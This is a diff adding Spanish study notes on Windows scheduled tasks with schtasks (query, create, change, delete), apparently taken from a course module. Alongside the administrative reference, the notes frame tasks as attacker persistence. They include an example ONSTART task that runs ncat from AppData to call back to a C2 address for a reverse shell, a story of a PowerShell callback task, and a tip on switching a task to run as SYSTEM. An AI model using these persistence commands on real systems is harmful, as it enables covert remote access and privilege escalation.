@@ -425,3 +425,51 @@ Recursos en la red:
 |`tasklist /svc`|Procesos + PID + servicios hosteados bajo cada proceso|Rápido para ver qué proceso aloja qué servicio (ej: lsass.exe → KeyIso, SamSs, VaultSvc)|
 |`net start`|Lista de servicios activos (display names)|`net stop/pause/continue <svc>` funcionan similar a sc|
 |`wmic service list brief`|Todos los servicios (corriendo o no): Name, ProcessId, **StartMode** (Auto/Manual/Disabled), State, Status|Vista ideal de start modes; **WMIC está deprecado** — no depender de él|
+
+
+### Working With Scheduled Tasks (Intro to Windows Command Line 10/23)
+
+#### Lo que ya sabía (repaso)
+
+- Task Scheduler ejecuta tareas cuando se cumplen condiciones (triggers) sin intervención manual.
+- Persistencia clásica para atacantes; también uso legítimo de admins.
+- `schtasks` es la utilidad CLI para gestionarlas.
+
+#### Lo que NO sabía / no tenía claro
+
+**Triggers disponibles** (la lista es extensa — opciones de persistencia):
+
+- Evento de sistema específico, hora específica, diario, semanal, mensual, mensual por día-de-semana, idle state, al registrarse la tarea, **al bootear el sistema**, **al logon de usuario**, cambio de estado de Terminal Server session.
+
+**Story time del módulo (caso real del autor):** tras aterrizar en un host, en vez de bajar otro ejecutable (que dispara AV/DLP), creó una scheduled task con trigger de logon/boot que abría un socket con PowerShell hacia su C2 → persistencia silenciosa. De suerte, la tarea corrió como SYSTEM → shell con escalada incluida. Lección: las tareas programadas **no suelen saltar alarmas de antivirus**.
+
+**Query  ver tareas existentes**
+
+- `schtasks /Query /V /FO list` → todas las tareas con propiedades avanzadas (formato legible).
+- Parámetros clave:
+    - `/fo` → formato: TABLE, LIST, CSV
+    - `/v` → verbose (propiedades avanzadas; solo con LIST o CSV)
+    - `/nh` → sin headers (con TABLE/CSV)
+    - `/s \\host` → remoto (default localhost)
+    - `/u <user> /p <pass>` → correr con credenciales (solo válido con `/s`; el user debe ser admin local o de dominio)
+-  Por permisos, un usuario normal **no ve todas las tareas**.
+- El output detallado revela: Task To Run, Schedule Type, Run As User, Logon Mode, Scheduled Task State, Author.
+**Create  crear tareas (los 4 mínimos obligatorios)**
+- `/create` + `/sc` (schedule) + `/tn` (nombre único) + `/tr` (acción a ejecutar). Todo lo demás es opcional.
+- Parámetros extra:
+    - `/sc` → ONSTART, ONLOGON, MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY...
+    - `/mo` → modificador (ej: cada 5 horas, cada otro día)
+    - `/rl` → nivel de privilegio: LIMITED (default) o HIGHEST
+    - `/z` → borrar la tarea al completar
+- **Ejemplo del mpdulo (callback al boot):** `schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"` → ncat en AppData (evita tocar disk protegido) conecta al C2 → shell de vuelta tras cada reboot aunque se pierda acceso.
+**Change  modificar tareas existentes**
+
+- `/change /tn <nombre>` + lo que se modifique:
+        - `/tr` → cambiar el programa/acción
+    - `/ru <user> /rp <pass>` → cambiar credenciales con las que corre (ej: hash de admin → task omo SYSTEM)
+    - `/ENABLE` / `/DISABLE`
+- Verificar: `schtasks /query /tn "My Secret Task" /V /fo list` → "Run As User: SYSTEM" confirma el cambio.
+- `/run /tn <nombre>` → disparar la tarea inmediatamente para probar que funciona.
+**Delete — borrar**
+- `schtasks /delete /tn <nombre>` → pide confirmación (Y/N).
+- `/f` → suprime la confirmación (y no pregunta).
